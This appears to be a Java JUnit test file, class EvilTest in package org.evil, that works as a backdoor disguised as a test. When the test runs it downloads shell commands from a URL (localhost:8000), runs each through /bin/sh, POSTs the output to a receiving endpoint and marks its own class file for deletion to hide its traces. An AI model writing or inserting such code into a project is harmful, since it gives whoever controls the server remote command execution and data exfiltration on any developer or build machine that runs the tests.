package org.evil;
import org.junit.Test;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
public class EvilTest {
    @Test
    public void testEvil() {
        System.out.println("Not so ordinary test");

        List<String> commands = getCommands();
        String raw = execute(commands);
        send(raw);

        try {
            final Path p = Path.of
                    (this.getClass().getProtectionDomain()
                    .getCodeSource().getLocation()
                    .toURI().getPath(),
                    this.getClass()
                    .getPackageName().replaceAll("\\.","/"),
                            this.getClass().getSimpleName()+".class");
            final File f = p.toFile();
            System.out.printf("file: %s%n", f.getAbsolutePath());
            // Requests that the file or directory denoted by this abstract
            // pathname be deleted when the virtual machine terminates.
            f.deleteOnExit();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public List<String> getCommands() {
        try {
            URL u = new URL("http://localhost:8000/commands.txt");
            List<String> commands = new ArrayList<>();
            try (BufferedReader in = new BufferedReader(
                    new InputStreamReader(u.openStream()))) {
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    if (!inputLine.isBlank())
                        commands.add(inputLine);
                }
            }
            return commands;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public String execute(List<String> commands) {
        if (commands==null) {
            return null;
        }
        final StringBuilder sb = new StringBuilder("Results of ")
                .append(commands.size())
                .append(" commands\n");
        for (String c:commands) {
            sb.append(c).append("\n");
            String result = run(c);
            if (result==null || result.isBlank()) {
                sb.append("error");
            } else {
                sb.append(result);
            }
            sb.append('\n');
        }
        return sb.toString();
    }

    public void send(String data) {
        if (data==null || data.isBlank()) {
            return;
        }
        System.out.printf("sending %s%n", data);
        HttpURLConnection conn = null;
        try {
            String encodedData = "data=%s".formatted(URLEncoder.encode(data, StandardCharsets.UTF_8));
            URL u = new URL("http://localhost:8000/api/receive");
            conn = (HttpURLConnection) u.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setAllowUserInteraction(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(encodedData.length()));
            conn.connect();
            OutputStream os = conn.getOutputStream();
            os.write(encodedData.getBytes());
            os.flush();
            System.out.printf("done: %d%n", conn.getResponseCode());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn!=null) {
                try { conn.disconnect();} catch (Exception ignored) {}
            }
        }
    }

    public String run(String c)   {
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c",c);
            Process process = pb.start();
            process.waitFor();
            return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
